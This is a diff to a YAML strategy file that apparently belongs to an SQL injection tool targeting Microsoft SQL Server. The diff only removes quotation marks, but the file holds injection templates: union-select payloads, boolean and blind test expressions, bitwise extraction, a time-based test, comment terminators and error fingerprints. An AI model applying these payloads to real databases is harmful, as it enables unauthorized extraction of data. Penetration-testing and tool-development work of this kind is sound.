@@ -1,4 +1,4 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
   SELECT 
@@ -192,38 +192,38 @@ strategy:
                65536
            )
    )
-  limit: "and rnum BETWEEN ${LIMIT} AND 65536"
-  failsafe: "CONVERT(varchar, (1337${INDICE}7330%2b1))"
-  calibrator: "replicate(${CALIBRATOR_HEX}, 1024)"
+  limit: and rnum BETWEEN ${LIMIT} AND 65536
+  failsafe: CONVERT(varchar, (1337${INDICE}7330%2b1))
+  calibrator: replicate(${CALIBRATOR_HEX}, 1024)
   limitBoundary: 1
-  endingComment: "--+-"
+  endingComment: --+-
   fingerprint: 
    errorMessage: 
     - "[Microsoft][SQL Server"
-    - "SQL Server"
+    - SQL Server
     
  normal: 
-  indices: "union select ${INDICES}"
-  capacity: "(select concat('${LEAD}${INDICE}', ${CALIBRATOR}))"
-  orderBy: "order by 1337"
+  indices: union select ${INDICES}
+  capacity: (select concat('${LEAD}${INDICE}', ${CALIBRATOR}))
+  orderBy: order by 1337
   
  boolean: 
   test: 
    falses: 
-    - "1 = 0"
+    - 1 = 0
     - "'a' %21= 'a'"
     - "'b' %21= 'b'"
-    - "1 = 2"
-    - "1 %21= 1"
-    - "2 %21= 2"
+    - 1 = 2
+    - 1 %21= 1
+    - 2 %21= 2
    trues: 
-    - "1 = 1"
-    - "0 = 0"
+    - 1 = 1
+    - 0 = 0
     - "'a' %21= 'b'"
     - "'a' = 'a'"
-    - "2 = 2"
-    - "1 %21= 2"
-   initialization: "0%2b1 = 1"
+    - 2 = 2
+    - 1 %21= 2
+   initialization: 0%2b1 = 1
    bit: |
     0 != (
         ascii(
@@ -235,9 +235,9 @@ strategy:
         ) 
         %26 ${BIT}
     )
-   length: "len(${INJECTION}) > ${INDEX}"
+   length: len(${INJECTION}) > ${INDEX}
    
-  blind: "and ${TEST}"
+  blind: and ${TEST}
   
   time: |
    ; if (${TEST}) 
